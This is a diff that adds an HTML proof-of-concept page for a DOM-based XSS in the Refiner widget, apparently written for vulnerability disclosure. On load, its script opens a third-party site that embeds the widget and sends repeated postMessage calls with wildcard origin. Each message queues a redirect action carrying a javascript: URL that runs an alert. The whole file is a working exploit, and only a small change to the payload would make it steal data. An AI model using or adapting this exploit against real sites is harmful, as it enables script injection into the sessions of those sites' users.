@@ -1,0 +1,38 @@
+<!-- refiner_domxss_poc.html -->
+
+<!doctype html>
+<html>
+   <head>
+      <meta charset="UTF-8" />
+      <title>Refiner DOM XSS PoC</title>
+      <script>
+         function pocLink() {
+            let win = window.open("https://saserzp.github.io/sample_website_with_refiner.html");
+            var messageData1	 = {
+			  sender: "refiner",
+			  name: "addToQueue",
+			  queueThis: [
+			      "triggerPartialSubmitFormAndRedirect",
+			      "db519250-110c-11f0-90c6-a310f88c5a50",
+			      {
+			        url: "javascript:alert(origin + 'this website is vulnerable to xss')",
+			        target: "_self"
+			      },
+			      {},
+			      {}
+			    ]
+			 };
+            setInterval(function() {
+               win.postMessage(messageData1, '*');
+            }, 500);
+         }
+
+         setTimeout(function() {
+            pocLink();
+         }, 500);
+      </script>
+   </head>
+   <body>
+      <a href="#" onclick="pocLink();">PoC link - Click here for the PoC to get executed</a>          
+   </body>
+</html>
